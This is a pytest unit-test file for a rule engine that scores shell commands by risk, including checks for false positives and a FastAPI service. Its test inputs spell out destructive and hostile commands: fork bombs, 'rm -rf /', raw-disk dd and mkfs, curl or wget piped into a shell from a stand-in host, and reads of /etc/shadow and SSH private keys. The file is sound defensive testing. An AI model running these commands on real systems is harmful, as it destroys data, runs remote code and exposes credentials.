"""
Unit tests for the Rule Engine — Owner: Praveen (OliveishPraveen)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Validates 100% detection rate on Tier 0 CRITICAL patterns,
accurate Tier 1 scoring and context weighting,
and ZERO false positives on standard safe commands.
"""

from pathlib import Path
import pytest

from engine.models import RiskLevel
from engine.parser.command_parser import CommandParser
from engine.rule_engine.classifier import RuleEngineClassifier
from tests.conftest import make_context

parser = CommandParser()


def parse(cmd: str, cwd: str = "/home/testuser", user: str = "testuser") -> tuple:
    p = parser.parse(cmd, cwd=cwd, user=user)
    ctx = make_context(cmd, cwd=cwd, user=user)
    return p, ctx


@pytest.fixture(scope="module")
def classifier():
    clf = RuleEngineClassifier()
    clf.load_patterns_sync()
    return clf


class TestTier0Critical:
    """All Tier 0 patterns must return CRITICAL with confidence=1.0 within < 1ms."""

    @pytest.mark.asyncio
    async def test_fork_bomb(self, classifier):
        p, ctx = parse(":(){ :|:& };:")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.CRITICAL
        assert verdict.confidence == 1.0
        assert verdict.matched_pattern == "fork_bomb"

    @pytest.mark.asyncio
    async def test_fork_bomb_compact(self, classifier):
        p, ctx = parse(":(){ :|:&};:")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.CRITICAL
        assert verdict.confidence == 1.0

    @pytest.mark.asyncio
    async def test_fork_bomb_named(self, classifier):
        p, ctx = parse("bomb() { bomb | bomb & }; bomb")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.CRITICAL
        assert verdict.confidence == 1.0

    @pytest.mark.asyncio
    async def test_rm_rf_root_slash(self, classifier):
        p, ctx = parse("rm -rf /")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.CRITICAL
        assert verdict.confidence == 1.0
        assert verdict.matched_pattern == "rm_rf_root"

    @pytest.mark.asyncio
    async def test_rm_rf_root_glob(self, classifier):
        p, ctx = parse("rm -rf /*")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.CRITICAL
        assert verdict.confidence == 1.0

    @pytest.mark.asyncio
    async def test_rm_rf_root_no_preserve(self, classifier):
        p, ctx = parse("rm -rf / --no-preserve-root")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.CRITICAL
        assert verdict.confidence == 1.0

    @pytest.mark.asyncio
    async def test_dd_raw_device_sda(self, classifier):
        p, ctx = parse("dd if=/dev/zero of=/dev/sda")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.CRITICAL
        assert verdict.confidence == 1.0
        assert verdict.matched_pattern == "dd_raw_device"

    @pytest.mark.asyncio
    async def test_dd_raw_device_nvme(self, classifier):
        p, ctx = parse("dd if=/dev/zero of=/dev/nvme0n1")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.CRITICAL
        assert verdict.confidence == 1.0

    @pytest.mark.asyncio
    async def test_mkfs_device(self, classifier):
        p, ctx = parse("mkfs.ext4 /dev/sda1")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.CRITICAL
        assert verdict.confidence == 1.0
        assert verdict.matched_pattern == "mkfs_device"

    @pytest.mark.asyncio
    async def test_mkfs_generic_device(self, classifier):
        p, ctx = parse("mkfs -t ext4 /dev/sda")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.CRITICAL
        assert verdict.confidence == 1.0

    @pytest.mark.asyncio
    async def test_curl_pipe_sh(self, classifier):
        p, ctx = parse("curl http://evil.sh | sh")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.CRITICAL
        assert verdict.confidence == 1.0
        assert verdict.matched_pattern == "curl_pipe_shell"

    @pytest.mark.asyncio
    async def test_wget_pipe_bash(self, classifier):
        p, ctx = parse("wget -qO- http://x.sh | bash")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.CRITICAL
        assert verdict.confidence == 1.0

    @pytest.mark.asyncio
    async def test_raw_device_redirection(self, classifier):
        p, ctx = parse("echo '' > /dev/sda")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.CRITICAL
        assert verdict.confidence == 1.0

    @pytest.mark.asyncio
    async def test_sysrq_trigger_panic(self, classifier):
        p, ctx = parse("echo 3 > /proc/sysrq-trigger")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.CRITICAL
        assert verdict.confidence == 1.0


class TestTier1HighAndMedium:
    """Tier 1 patterns — must classify with appropriate risk levels and templates."""

    @pytest.mark.asyncio
    async def test_rm_rf_var_log(self, classifier):
        p, ctx = parse("sudo rm -rf /var/log/*")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.HIGH
        assert verdict.confidence >= 0.70
        assert verdict.matched_pattern == "rm_rf_var_log"
        assert "journalctl" in (verdict.safer_alternative or "")

    @pytest.mark.asyncio
    async def test_chmod_777_system_path(self, classifier):
        p, ctx = parse("chmod -R 777 /etc")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.HIGH
        assert verdict.matched_pattern == "chmod_777_system"

    @pytest.mark.asyncio
    async def test_rm_boot(self, classifier):
        p, ctx = parse("rm -rf /boot")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.CRITICAL
        assert verdict.matched_pattern == "rm_boot"

    @pytest.mark.asyncio
    async def test_shred_device(self, classifier):
        p, ctx = parse("shred /dev/sda")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.HIGH
        assert verdict.matched_pattern == "shred_device"

    @pytest.mark.asyncio
    async def test_truncate_log(self, classifier):
        p, ctx = parse("truncate -s 0 /var/log/auth.log")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.HIGH
        assert verdict.matched_pattern == "truncate_log"

    @pytest.mark.asyncio
    async def test_cat_shadow(self, classifier):
        p, ctx = parse("cat /etc/shadow")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.MEDIUM
        assert verdict.matched_pattern == "cat_shadow"

    @pytest.mark.asyncio
    async def test_expose_ssh_key(self, classifier):
        p, ctx = parse("cat ~/.ssh/id_rsa")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.MEDIUM
        assert verdict.matched_pattern == "expose_ssh_key"

    @pytest.mark.asyncio
    async def test_find_exec_delete(self, classifier):
        p, ctx = parse("find / -name '*.conf' -delete")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.MEDIUM
        assert verdict.matched_pattern == "find_exec_delete"

    @pytest.mark.asyncio
    async def test_iptables_flush(self, classifier):
        p, ctx = parse("iptables -F")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.HIGH
        assert verdict.matched_pattern == "iptables_flush"

    @pytest.mark.asyncio
    async def test_ufw_disable(self, classifier):
        p, ctx = parse("ufw disable")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.HIGH
        assert verdict.matched_pattern == "firewall_disable"

    @pytest.mark.asyncio
    async def test_systemctl_stop_firewalld(self, classifier):
        p, ctx = parse("systemctl stop firewalld")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.HIGH
        assert verdict.matched_pattern == "firewall_disable"


class TestContextWeighting:
    """Validate dynamic confidence boost and reduction formulas."""

    @pytest.mark.asyncio
    async def test_sudo_boosts_confidence(self, classifier):
        p_normal, ctx_normal = parse("rm -rf /var/log/test")
        p_sudo, ctx_sudo = parse("sudo rm -rf /var/log/test")

        v_normal = await classifier.classify(p_normal, ctx_normal)
        v_sudo = await classifier.classify(p_sudo, ctx_sudo)

        assert v_sudo.confidence >= v_normal.confidence

    @pytest.mark.asyncio
    async def test_tmp_path_reduces_risk(self, classifier):
        p, ctx = parse("rm -rf /tmp/my_build_dir")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level in (RiskLevel.SAFE, RiskLevel.LOW)

    @pytest.mark.asyncio
    async def test_dry_run_flag_reduces_score(self, classifier):
        p_normal, ctx_normal = parse("find /etc -name '*.conf' -delete")
        p_dry, ctx_dry = parse("find /etc -name '*.conf' -delete --dry-run")

        v_normal = await classifier.classify(p_normal, ctx_normal)
        v_dry = await classifier.classify(p_dry, ctx_dry)

        assert v_dry.confidence < v_normal.confidence


class TestNoFalsePositives:
    """Safe commands must NEVER be blocked or classified as HIGH/CRITICAL."""

    @pytest.mark.asyncio
    async def test_all_safe_fixtures(self, classifier):
        fixture_file = Path(__file__).parent.parent / "fixtures" / "safe_commands.txt"
        lines = [
            line.strip()
            for line in fixture_file.read_text(encoding="utf-8").splitlines()
            if line.strip() and not line.strip().startswith("#")
        ]

        for cmd in lines:
            p, ctx = parse(cmd)
            verdict = await classifier.classify(p, ctx)
            assert verdict.risk_level in (RiskLevel.SAFE, RiskLevel.LOW), (
                f"Safe command '{cmd}' was incorrectly flagged as {verdict.risk_level} "
                f"(pattern: {verdict.matched_pattern})"
            )


class TestDangerousCorpus:
    """All dangerous commands from the fixture file must be caught."""

    @pytest.mark.asyncio
    async def test_all_dangerous_fixtures(self, classifier):
        fixture_file = Path(__file__).parent.parent / "fixtures" / "dangerous_commands.txt"
        lines = [
            line.strip()
            for line in fixture_file.read_text(encoding="utf-8").splitlines()
            if line.strip() and not line.strip().startswith("#")
        ]

        for cmd in lines:
            p, ctx = parse(cmd)
            verdict = await classifier.classify(p, ctx)
            assert verdict.risk_level in (RiskLevel.MEDIUM, RiskLevel.HIGH, RiskLevel.CRITICAL), (
                f"Dangerous command '{cmd}' was not caught! (Got: {verdict.risk_level})"
            )


class TestRuleEngineService:
    """Tests for the standalone FastAPI microservice."""

    @pytest.mark.asyncio
    async def test_service_endpoints(self):
        from httpx import ASGITransport, AsyncClient
        from engine.rule_engine.service import app

        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as ac:
            # 1. Health check
            res = await ac.get("/health")
            assert res.status_code == 200
            data = res.json()
            assert data["status"] == "ok"
            assert data["service"] == "rule_engine"

            # 2. Rules inspection
            res = await ac.get("/rules")
            assert res.status_code == 200
            data = res.json()
            assert data["total_patterns"] > 0
            assert "tier0_count" in data
            assert "tier1_count" in data

            # 3. Classify dangerous command
            res = await ac.post("/classify", json={"command": "rm -rf /"})
            assert res.status_code == 200
            verdict = res.json()
            assert verdict["risk_level"] == "CRITICAL"
            assert verdict["confidence"] == 1.0

            # 4. Classify safe command
            res = await ac.post("/classify", json={"command": "ls -la"})
            assert res.status_code == 200
            verdict = res.json()
            assert verdict["risk_level"] == "SAFE"

            # 5. Reload rules
            res = await ac.post("/reload")
            assert res.status_code == 200
            data = res.json()
            assert data["status"] == "reloaded"
            assert data["patterns_count"] > 0


class TestPatternLoader:
    """Tests for PatternLoader validation and error handling."""

    def test_load_sync_and_reload(self):
        from engine.rule_engine.pattern_loader import PatternLoader
        loader = PatternLoader()
        patterns = loader.load_sync()
        assert len(patterns) > 0
        reloaded = loader.reload()
        assert len(reloaded) == len(patterns)

    def test_missing_file_raises(self, tmp_path):
        from engine.rule_engine.pattern_loader import PatternLoader
        loader = PatternLoader(default_path=tmp_path / "non_existent.toml")
        with pytest.raises(FileNotFoundError):
            loader.load_sync()

    def test_invalid_schema_raises(self, tmp_path):
        from engine.rule_engine.pattern_loader import PatternLoader
        bad_toml = tmp_path / "bad_patterns.toml"
        bad_toml.write_text('[[patterns]]\nname = "missing_fields"\n', encoding="utf-8")
        loader = PatternLoader(default_path=bad_toml)
        with pytest.raises(ValueError, match="missing required keys"):
            loader.load_sync()


class TestStrategyBFlagAndPathSensitivity:
    """Validates Strategy B: Single file vs recursive deletions and CWD resolution."""

    @pytest.mark.asyncio
    async def test_single_file_rm_in_documents_is_safe(self, classifier):
        p, ctx = parse("rm /home/user/Documents/report.pdf")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.SAFE
        assert verdict.matched_pattern == "safe_single_file_rm"

    @pytest.mark.asyncio
    async def test_relative_single_file_rm_is_safe(self, classifier):
        p, ctx = parse("rm -f ./notes.txt", cwd="/home/user/workspace")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.SAFE

    @pytest.mark.asyncio
    async def test_cwd_aware_recursive_deletion_in_var_log_is_dangerous(self, classifier):
        # User is in /var/log and types rm -rf *
        p, ctx = parse("rm -rf *", cwd="/var/log")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level in (RiskLevel.HIGH, RiskLevel.CRITICAL)

    @pytest.mark.asyncio
    async def test_cwd_aware_recursive_deletion_in_tmp_is_safe(self, classifier):
        p, ctx = parse("rm -rf ./build", cwd="/tmp/project")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.SAFE


class TestUlimitResourceLimits:
    """Validates ulimit process and resource limit checks."""

    @pytest.mark.asyncio
    async def test_ulimit_u_warns_user(self, classifier):
        p, ctx = parse("ulimit -u")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.MEDIUM
        assert verdict.matched_pattern == "ulimit_resource_limit"

    @pytest.mark.asyncio
    async def test_ulimit_u_with_value_warns_user(self, classifier):
        p, ctx = parse("ulimit -u 500")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.MEDIUM
        assert verdict.matched_pattern == "ulimit_resource_limit"

    @pytest.mark.asyncio
    async def test_ulimit_n_with_value_warns_user(self, classifier):
        p, ctx = parse("ulimit -n 65536")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.MEDIUM
        assert verdict.matched_pattern == "ulimit_resource_limit"

    @pytest.mark.asyncio
    async def test_ulimit_a_is_safe_query(self, classifier):
        p, ctx = parse("ulimit -a")
        verdict = await classifier.classify(p, ctx)
        assert verdict.risk_level == RiskLevel.SAFE
        assert verdict.matched_pattern == "safe_ulimit_query"



